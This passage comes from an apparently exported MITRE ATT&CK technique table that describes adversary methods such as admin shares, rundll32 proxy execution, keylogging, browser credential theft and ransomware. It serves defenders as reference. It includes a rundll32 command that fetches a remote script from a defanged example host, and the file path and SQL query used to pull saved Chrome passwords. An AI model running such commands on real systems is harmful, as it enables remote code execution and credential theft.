Windows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include `C$`, `ADMIN$`, and `IPC$`. Adversaries may use this technique in conjunction with administrator-level [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely access a networked system over SMB,(Citation: Wikipedia Server Message Block) to interact with systems using remote procedure calls (RPCs),(Citation: TechNet RPC) transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Service Execution](https://attack.mitre.org/techniques/T1569/002), and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). Adversaries can also use NTLM hashes to access administrator shares on systems with [Pass the Hash](https://attack.mitre.org/techniques/T1550/002) and certain configuration and patch levels.(Citation: Microsoft Admin Shares)",Windows,FALSE,FALSE,2020-02-11T18:25:28Z
attack-pattern--92d7da27-2d91-488e-a00c-059dc162766d,27,T1041,Exfiltration Over C2 Channel,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,"ESXi, Linux, macOS, Windows",FALSE,FALSE,2017-05-31T21:30:41Z
attack-pattern--cba37adb-d6fb-4610-b069-dd04c0643384,27,T1518.001,Security Software Discovery,"Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as cloud monitoring agents and anti-virus. Adversaries may use the information from [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

Example commands that can be used to obtain security software information are [netsh](https://attack.mitre.org/software/S0108), <code>reg query</code> with [Reg](https://attack.mitre.org/software/S0075), <code>dir</code> with [cmd](https://attack.mitre.org/software/S0106), and [Tasklist](https://attack.mitre.org/software/S0057), but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.

Adversaries may also utilize the [Cloud API](https://attack.mitre.org/techniques/T1059/009) to discover cloud-native security software installed on compute infrastructure, such as the AWS CloudWatch agent, Azure VM Agent, and Google Cloud Monitor agent. These agents  may collect  metrics and logs from the VM, which may be centrally aggregated in a cloud-based monitoring platform.","IaaS, Linux, macOS, Windows",FALSE,FALSE,2020-02-21T21:16:18Z
attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5,26,T1218.011,Rundll32,"Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).

Rundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute.(Citation: Trend Micro CPL) For example, [ClickOnce](https://attack.mitre.org/techniques/T1127/002) can be proxied through Rundll32.exe.

Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https[:]//www[.]example[.]com/malicious.sct"")""</code>  This behavior has been seen used by malware such as Poweliks.(Citation: This is Security Command Line Confusion)

Threat actors may also abuse legitimate, signed system DLLs (e.g., <code>zipfldr.dll, ieframe.dll</code>) with <code>rundll32.exe</code> to execute malicious programs or scripts indirectly, making their activity appear more legitimate and evading detection.(Citation: lolbas project Zipfldr.dll)(Citation: lolbas project Ieframe.dll)

Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll) DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).

Additionally, adversaries may use [Masquerading](https://attack.mitre.org/techniques/T1036) techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.(Citation: rundll32.exe defense evasion)",Windows,FALSE,FALSE,2020-01-23T18:03:46Z
attack-pattern--09a60ea3-a8d1-4ae5-976e-5783248b72a4,26,T1056.001,Keylogging,"Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.(Citation: Talos Kimsuky Nov 2021)

Keylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes.(Citation: Adventures of a Keystroke) Some methods include:

* Hooking API callbacks used for processing keystrokes. Unlike [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004), this focuses solely on API functions intended for processing keystroke data.
* Reading raw keystroke data from the hardware buffer.
* Windows Registry modifications.
* Custom drivers.
* [Modify System Image](https://attack.mitre.org/techniques/T1601) may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.(Citation: Cisco Blog Legacy Device Attacks)","Linux, macOS, Network Devices, Windows",FALSE,FALSE,2020-02-11T18:58:11Z
attack-pattern--0f4a0c76-ab2d-4cb0-85d3-3f0efb8cba0d,26,T1059.007,JavaScript,"Adversaries may abuse various implementations of JavaScript for execution. JavaScript (JS) is a platform-independent scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.(Citation: NodeJS)

JScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and Internet Explorer HTML Application (HTA) pages.(Citation: JScrip May 2018)(Citation: Microsoft JScript 2007)(Citation: Microsoft Windows Scripts)

JavaScript for Automation (JXA) is a macOS scripting language based on JavaScript, included as part of Apple’s Open Scripting Architecture (OSA), that was introduced in OSX 10.10. Apple’s OSA provides scripting capabilities to control applications, interface with the operating system, and bridge access into the rest of Apple’s internal APIs. As of OSX 10.10, OSA only supports two languages, JXA and [AppleScript](https://attack.mitre.org/techniques/T1059/002). Scripts can be executed via the command line utility <code>osascript</code>, they can be compiled into applications or script files via <code>osacompile</code>, and they can be compiled and executed in memory of other programs by leveraging the OSAKit Framework.(Citation: Apple About Mac Scripting 2016)(Citation: SpecterOps JXA 2020)(Citation: SentinelOne macOS Red Team)(Citation: Red Canary Silver Sparrow Feb2021)(Citation: MDSec macOS JXA and VSCode)

Adversaries may abuse various implementations of JavaScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) or downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for adversaries to obfuscate their content as part of [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).","Linux, macOS, Windows",FALSE,FALSE,2020-06-23T19:12:24Z
attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32,26,T1543.003,Windows Service,"Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.

Adversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. 

Adversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as ""Bring Your Own Vulnerable Driver"" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)

Services may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002).

To make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create ‘hidden’ services (i.e., [Hide Artifacts](https://attack.mitre.org/techniques/T1564)), for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`.(Citation: SANS 1)(Citation: SANS 2)",Windows,FALSE,FALSE,2020-01-17T19:13:50Z
attack-pattern--88d31120-5bc7-4ce3-a9c0-7cf147be8e54,26,T1583.006,Web Services,"Adversaries may register for web services that can be used during targeting. A variety of popular websites exist for adversaries to register for a web-based service that can be abused during later stages of the adversary lifecycle, such as during Command and Control ([Web Service](https://attack.mitre.org/techniques/T1102)), [Exfiltration Over Web Service](https://attack.mitre.org/techniques/T1567), or [Phishing](https://attack.mitre.org/techniques/T1566). Using common services, such as those offered by Google, GitHub, or Twitter, makes it easier for adversaries to hide in expected noise.(Citation: FireEye APT29)(Citation: Hacker News GitHub Abuse 2024) By utilizing a web service, adversaries can make it difficult to physically tie back operations to them.",PRE,FALSE,FALSE,2020-10-01T00:50:29Z
attack-pattern--212306d8-efa4-44c9-8c2d-ed3d2e224aa0,25,T1587.001,Malware,"Adversaries may develop malware and malware components that can be used during targeting. Building malicious software can include the development of payloads, droppers, post-compromise tools, backdoors (including backdoored images), packers, C2 protocols, and the creation of infected removable media. Adversaries may develop malware to support their operations, creating a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.(Citation: Mandiant APT1)(Citation: Kaspersky Sofacy)(Citation: ActiveMalwareEnergy)(Citation: FBI Flash FIN7 USB)

During malware development, adversaries may intentionally include indicators aligned with other known actors in order to mislead attribution by defenders.(Citation: Olympic Destroyer)(Citation: Risky Bulletin Threat actor impersonates FSB APT)(Citation: GamaCopy organization)

As with legitimate development efforts, different skill sets may be required for developing malware. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's malware development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the malware.

Some aspects of malware development, such as C2 protocol development, may require adversaries to obtain additional infrastructure. For example, malware developed that will communicate with Twitter for C2, may require use of [Web Services](https://attack.mitre.org/techniques/T1583/006).(Citation: FireEye APT29)",PRE,FALSE,FALSE,2020-10-01T01:33:01Z
attack-pattern--bf1b6176-597c-4600-bfcd-ac989670f96b,25,T1567.002,Exfiltration to Cloud Storage,"Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.

Examples of cloud storage services include Dropbox and Google Docs. Exfiltration to these cloud storage services can provide a significant amount of cover to the adversary if hosts within the network are already communicating with the service.","ESXi, Linux, macOS, Windows",FALSE,FALSE,2020-03-09T15:04:32Z
attack-pattern--58a3e6aa-4453-4cc8-a51f-4befe80b31a8,23,T1555.003,Credentials from Web Browsers,"Adversaries may acquire credentials from web browsers by reading files specific to the target browser.(Citation: Talos Olympic Destroyer 2018) Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.

For example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, <code>AppData\Local\Google\Chrome\User Data\Default\Login Data</code> and executing a SQL query: <code>SELECT action_url, username_value, password_value FROM logins;</code>. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function <code>CryptUnprotectData</code>, which uses the victim’s cached logon credentials as the decryption key.(Citation: Microsoft CryptUnprotectData April 2018)
 
Adversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc.(Citation: Proofpoint Vega Credential Stealer May 2018)(Citation: FireEye HawkEye Malware July 2017) Windows stores Internet Explorer and Microsoft Edge credentials in Credential Lockers managed by the [Windows Credential Manager](https://attack.mitre.org/techniques/T1555/004).

Adversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.(Citation: GitHub Mimikittenz July 2016)

After acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).","Linux, macOS, Windows",FALSE,FALSE,2020-02-12T18:57:36Z
attack-pattern--7bdca9d5-d500-4d7d-8c52-5fd47baf4c0c,23,T1036.004,Masquerade Task or Service,"Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description.(Citation: TechNet Schtasks)(Citation: Systemd Service Units) Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.

Tasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.(Citation: Palo Alto Shamoon Nov 2016)(Citation: Fysbis Dr Web Analysis)","Linux, macOS, Windows",FALSE,FALSE,2020-02-10T20:30:07Z
attack-pattern--deb98323-e13f-4b0c-8d94-175379069062,23,T1027.002,Software Packing,"Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.(Citation: ESET FinFisher Jan 2018) 

Utilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.(Citation: Awesome Executable Packing)","Linux, macOS, Windows",FALSE,FALSE,2020-02-05T14:17:46Z
attack-pattern--b21c3b2d-02e6-45b1-980b-e69051040839,22,T1068,Exploitation for Privilege Escalation,"Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.

When initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.

Adversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) or [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570).","Containers, Linux, macOS, Windows",FALSE,FALSE,2017-05-31T21:30:55Z
attack-pattern--30208d3e-0d6b-43c8-883e-44462a514619,21,T1119,Automated Collection,"Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. 

In cloud-based environments, adversaries may also use cloud APIs, data pipelines, command line interfaces, or extract, transform, and load (ETL) services to automatically collect data.(Citation: Mandiant UNC3944 SMS Phishing 2023) 

This functionality could also be built into remote access tools. 

This technique may incorporate use of other techniques such as [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) and [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570) to identify and move files, as well as [Cloud Service Dashboard](https://attack.mitre.org/techniques/T1538) and [Cloud Storage Object Discovery](https://attack.mitre.org/techniques/T1619) to identify resources in cloud environments.","IaaS, Linux, macOS, Office Suite, SaaS, Windows",FALSE,FALSE,2017-05-31T21:31:27Z
attack-pattern--391d824f-0ef1-47a0-b0ee-c59a75e27670,20,T1106,Native API,"Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes.(Citation: NT API Windows)(Citation: Linux Kernel API) These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.

Adversaries may abuse these OS API functions as a means of executing behaviors. Similar to [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system.

Native API functions (such as <code>NtCreateProcess</code>) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries.(Citation: OutFlank System Calls)(Citation: CyberBit System Calls)(Citation: MDSec System Calls) For example, functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code> will allow programs and scripts to start other processes.(Citation: Microsoft CreateProcess)(Citation: GNU Fork) This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.(Citation: Microsoft Win32)(Citation: LIBC)(Citation: GLIBC)

Higher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.(Citation: Microsoft NET)(Citation: Apple Core Services)(Citation: MACOS Cocoa)(Citation: macOS Foundation)

Adversaries may use assembly to directly or in-directly invoke syscalls in an attempt to subvert defensive sensors and detection signatures such as user mode API-hooks.(Citation: Redops Syscalls) Adversaries may also attempt to tamper with sensors and defensive tools associated with API monitoring, such as unhooking monitored functions via [Disable or Modify Tools](https://attack.mitre.org/techniques/T1685).","Linux, macOS, Windows",FALSE,FALSE,2017-05-31T21:31:17Z
attack-pattern--42e8de7b-37b2-4258-905a-6897815e58e0,20,T1036,Masquerading,"Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.

Renaming abusable system utilities to evade security monitoring is also a form of [Masquerading](https://attack.mitre.org/techniques/T1036).(Citation: LOLBAS Main Site)","Containers, ESXi, Linux, macOS, Windows",FALSE,FALSE,2017-05-31T21:30:38Z
attack-pattern--0259baeb-9f63-4c69-bf10-eb038c390688,19,T1113,Screen Capture,"Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as <code>CopyFromScreen</code>, <code>xwd</code>, or <code>screencapture</code>.(Citation: CopyFromScreen .NET)(Citation: Antiquated Mac Malware)
","Linux, macOS, Windows",FALSE,FALSE,2017-05-31T21:31:25Z
attack-pattern--2db31dcd-54da-405d-acef-b9129b816ed6,19,T1021.004,SSH,"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into remote machines using Secure Shell (SSH). The adversary may then perform actions as the logged-on user.

SSH is a protocol that allows authorized users to open remote shells on other computers. Many Linux and macOS versions come with SSH installed by default, although typically disabled until the user enables it. On ESXi, SSH can be enabled either directly on the host (e.g., via `vim-cmd hostsvc/enable_ssh`) or via vCenter.(Citation: Sygnia ESXi Ransomware 2025)(Citation: TrendMicro ESXI Ransomware)(Citation: Sygnia Abyss Locker 2025) The SSH server can be configured to use standard password authentication or public-private keypairs in lieu of or in addition to a password. In this authentication scenario, the user’s public key must be in a special file on the computer running the server that lists which keypairs are allowed to login as that user (i.e., [SSH Authorized Keys](https://attack.mitre.org/techniques/T1098/004)).","ESXi, Linux, macOS",FALSE,FALSE,2020-02-11T18:27:15Z
attack-pattern--65013dd2-bc61-43e3-afb5-a14c4fa7437a,19,T1585.002,Email Accounts,"Adversaries may create email accounts that can be used during targeting. Adversaries can use accounts created with email providers to further their operations, such as leveraging them to conduct [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Phishing](https://attack.mitre.org/techniques/T1566).(Citation: Mandiant APT1) Establishing email accounts may also allow adversaries to abuse free services – such as trial periods – to [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) for follow-on purposes.(Citation: Free Trial PurpleUrchin)

Adversaries may also take steps to cultivate a persona around the email account, such as through use of [Social Media Accounts](https://attack.mitre.org/techniques/T1585/001), to increase the chance of success of follow-on behaviors. Created email accounts can also be used in the acquisition of infrastructure (ex: [Domains](https://attack.mitre.org/techniques/T1583/001)).(Citation: Mandiant APT1)

To decrease the chance of physically tying back operations to themselves, adversaries may make use of disposable email services.(Citation: Trend Micro R980 2016)",PRE,FALSE,FALSE,2020-10-01T01:09:53Z
attack-pattern--731f4f55-b6d0-41d1-a7a9-072a66389aea,19,T1090,Proxy,"Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use these types of proxies to manage command and control communications, reduce the number of simultaneous outbound network connections, provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion. Adversaries may chain together multiple proxies to further disguise the source of malicious traffic.

Adversaries can also take advantage of routing schemes in Content Delivery Networks (CDNs) to proxy command and control traffic.","ESXi, Linux, macOS, Network Devices, Windows",FALSE,FALSE,2017-05-31T21:31:08Z
attack-pattern--bf90d72c-c00b-45e3-b3aa-68560560d4c5,19,T1570,Lateral Tool Transfer,"Adversaries may transfer tools or other files between systems in a compromised environment. Once brought into the victim environment (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) files may then be copied from one system to another to stage adversary tools or other files over the course of an operation.

Adversaries may copy files between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) to connected network shares or with authenticated connections via [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001).(Citation: Unit42 LockerGoga 2019)

Files can also be transferred using native or otherwise present tools on the victim system, such as scp, rsync, curl, sftp, and [ftp](https://attack.mitre.org/software/S0095). In some cases, adversaries may be able to leverage [Web Service](https://attack.mitre.org/techniques/T1102)s such as Dropbox or OneDrive to copy files from one machine to another via shared, automatically synced folders.(Citation: Dropbox Malware Sync)","ESXi, Linux, macOS, Windows",FALSE,FALSE,2020-03-11T21:01:00Z
attack-pattern--c32f7008-9fea-41f7-8366-5eb9b74bd896,19,T1012,Query Registry,"Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.

The Registry contains a significant amount of information about the operating system, configuration, software, and security.(Citation: Wikipedia Windows Registry) Information can easily be queried using the [Reg](https://attack.mitre.org/software/S0075) utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from [Query Registry](https://attack.mitre.org/techniques/T1012) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",Windows,FALSE,FALSE,2017-05-31T21:30:25Z
attack-pattern--c3d4bdd9-2cfe-4a80-9d0c-07a29ecdce8f,19,T1078.002,Domain Accounts,"Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.(Citation: TechNet Credential Theft) Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.(Citation: Microsoft AD Accounts)

Adversaries may compromise domain accounts, some with a high level of privileges, through various means such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) or password reuse, allowing access to privileged resources of the domain.","ESXi, Linux, macOS, Windows",FALSE,FALSE,2020-03-13T20:21:54Z
attack-pattern--25659dd6-ea12-45c4-97e6-381e3e4b593e,18,T1087.001,Local Account,"Adversaries may attempt to get a listing of local system accounts. This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior.

Commands such as <code>net user</code> and <code>net localgroup</code> of the [Net](https://attack.mitre.org/software/S0039) utility and <code>id</code> and <code>groups</code> on macOS and Linux can list local users and groups.(Citation: Mandiant APT1)(Citation: id man page)(Citation: groups man page) On Linux, local users can also be enumerated through the use of the <code>/etc/passwd</code> file. On macOS, the <code>dscl . list /Users</code> command can be used to enumerate local accounts. On ESXi servers, the `esxcli system account list` command can list local user accounts.(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)","ESXi, Linux, macOS, Windows",FALSE,FALSE,2020-02-21T21:07:55Z
attack-pattern--7807d3a4-a885-4639-a786-c1ed41484970,18,T1588.001,Malware,"Adversaries may buy, steal, or download malware that can be used during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, packers, and C2 protocols. Adversaries may acquire malware to support their operations, obtaining a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.

In addition to downloading free malware from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware development, criminal marketplaces (including Malware-as-a-Service, or MaaS), or from individuals. In addition to purchasing malware, adversaries may steal and repurpose malware from third-party entities (including other adversaries).",PRE,FALSE,FALSE,2020-10-01T02:06:11Z
attack-pattern--b1ccd744-3f78-4a0e-9bb2-2002057f7928,18,T1585.001,Social Media Accounts,"Adversaries may create and cultivate social media accounts that can be used during targeting. Adversaries can create social media accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage)

For operations incorporating social engineering, the utilization of a persona on social media may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single social media site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Establishing a persona  on social media may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos. 

Once a persona has been developed an adversary can use it to create connections to targets of interest. These connections may be direct or may include trying to connect through others.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage) These accounts may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003)).",PRE,FALSE,FALSE,2020-10-01T01:08:41Z
attack-pattern--b3d682b6-98f2-4fb0-aa3b-b4df007ca70a,18,T1027,Obfuscated Files or Information,"Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. 

Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.(Citation: Volexity PowerDuke November 2016) Adversaries may also use compressed or archived scripts, such as JavaScript. 

Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.(Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled.(Citation: Carbon Black Obfuscation Sept 2016)

Adversaries may also abuse [Command Obfuscation](https://attack.mitre.org/techniques/T1027/010) to obscure commands executed from payloads or directly via [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.(Citation: FireEye Obfuscation June 2017)(Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017)","ESXi, Linux, macOS, Network Devices, Windows",FALSE,FALSE,2017-05-31T21:30:32Z
attack-pattern--b80d107d-fa0d-4b60-9684-b0433e8bdba0,18,T1486,Data Encrypted for Impact,"Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.(Citation: US-CERT Ransomware 2016)(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017)(Citation: US-CERT SamSam 2018)

